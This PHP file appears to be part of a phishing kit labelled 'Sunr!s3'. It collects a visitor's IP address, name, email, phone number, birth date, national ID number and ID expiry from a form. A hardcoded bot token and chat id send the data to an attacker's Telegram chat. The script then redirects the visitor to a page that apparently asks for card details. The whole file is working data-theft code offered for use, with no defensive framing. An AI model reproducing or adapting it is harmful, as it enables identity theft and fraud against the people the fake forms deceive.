<?php

session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$config_token = "5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo";
$config_chat = "5764038637";

function callAPI($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   // EXECUTE:
   $result = curl_exec($curl);
   curl_close($curl);
}

$_SESSION['first'] = $_POST['first'];
$_SESSION['last'] = $_POST['last'];
$_SESSION['email'] = $_POST['email'];
$_SESSION['number'] = $_POST['number'];
$_SESSION['date'] = $_POST['date'];
$_SESSION['id'] = $_POST['id'];
$_SESSION['expi'] = $_POST['expi'];


if (empty($_SESSION['first']) || empty($_SESSION['last']) || empty($_SESSION['email']) || empty($_SESSION['number']) || empty($_SESSION['date']) || empty($_SESSION['id']) || empty($_SESSION['expi'])) {
    header('Location: ../info.php'); // Redirect back to the login page
    exit;
}

################

$TELG.= urlencode("<b>Sunr!s3 Info</b> \n ".$ip."\n");
$TELG.= urlencode("»<b> First name</b> : ".$_SESSION['first']."\n");
$TELG.= urlencode("»<b> Last name</b> : ".$_SESSION['last']."\n");
$TELG.= urlencode("»<b> E-mail</b> : ".$_SESSION['email']."\n");
$TELG.= urlencode("»<b> Phone number</b> : ".$_SESSION['number']."\n");
$TELG.= urlencode("»<b> Birth date</b> : ".$_SESSION['date']."\n");
$TELG.= urlencode("»<b> ID-Number</b> : ".$_SESSION['id']."\n");
$TELG.= urlencode("»<b> ID-Expiration </b> : ".$_SESSION['expi']."\n");


callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$TELG.'&parse_mode=html');
header('Location: ../cc.php ');

################

?>
